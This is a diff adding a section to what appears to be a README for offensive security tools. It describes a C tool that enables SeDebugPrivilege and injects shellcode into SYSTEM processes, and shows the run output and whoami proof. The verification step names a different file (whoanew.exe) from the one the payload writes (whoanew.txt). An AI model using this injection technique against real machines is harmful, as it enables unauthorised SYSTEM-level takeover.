@@ -48,3 +48,53 @@ SELECT * FROM stats;
 
 [URLs, usernames and passwords are going to show here]
 ```
+Here's a short description for your tool:
+
+---
+
+## [Privilege Escalation via SeDebugPrivilege (C)](https://github.com/yourusername/yourrepo)
+
+C tool that enables SeDebugPrivilege, enumerates running processes, and injects shellcode into processes running as SYSTEM (S-1-5-18). The included shellcode executes `cmd.exe /c whoami /all > C:\temp\whoanew.txt` as a proof of concept.
+
+```powershell
+PS C:\tools> .\SeDebugInject.exe
+Begin
+[+] Successfully enabled SeDebugPrivilege on current token
+[+] Successfully made a snapshot
+[+] Successfully went to first
+
+[!] Failed opening process [System Process]
+  -> Error code : 5
+
+[!] Failed opening process smss.exe
+  -> Error code : 5
+
+[+] Successfully opened process winlogon.exe 
+[+] Successfully Opened ProcessTOken
+[+] Successfully got token information
+[+] Successfully got token info2 
+  -> The SID doesn't match defined SID
+
+[+] Successfully opened process services.exe 
+[+] Successfully Opened ProcessTOken
+[+] Successfully got token information
+[+] Successfully got token info2 
+[+] Success while allocating remote memory
+[+] Success while writing remote memory
+[+] Success while creating remote thread
+[~] Attempting to start remote thread . . .
+[ +++ ] Remote thread started
+```
+
+Check the output file to verify execution:
+
+```powershell
+PS C:\> type C:\temp\whoanew.exe
+
+USER INFORMATION
+----------------
+
+User Name           SID
+=================== =============================================
+nt authority\system S-1-5-18
+```
